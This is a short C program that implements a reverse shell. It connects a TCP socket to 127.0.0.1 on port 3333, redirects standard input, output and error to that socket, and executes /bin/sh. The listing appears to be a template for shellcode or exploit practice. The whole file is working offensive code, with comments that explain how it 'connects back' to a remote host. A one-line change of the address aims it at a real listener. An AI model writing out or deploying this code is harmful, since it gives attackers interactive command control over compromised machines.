#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

int main(void)
{
 char client_ip[] =  "127.0.0.1";
 int sock_file_descripter;
 int network_port = 3333;//tcp port that shell will bind to
 struct sockaddr_in mysockaddr;

 sock_file_descripter = socket(AF_INET, SOCK_STREAM, 0);

 //Initialize sockaddr_in struct with remote ip address to connect to
 mysockaddr.sin_family = AF_INET; //2, TCP protocol
 mysockaddr.sin_port = htons(network_port);//tcp port to connect on remote host
 mysockaddr.sin_addr.s_addr = inet_addr(client_ip);//IP address of remote host to connect back to.

 connect(sock_file_descripter, (struct sockaddr *)&mysockaddr, sizeof(struct sockaddr));

 dup2(sock_file_descripter, 0); //stdin
 dup2(sock_file_descripter, 1); //stdout
 dup2(sock_file_descripter, 2); //stderror

 execve("/bin/sh", NULL, NULL);//Execute shell command
 return 0;
}
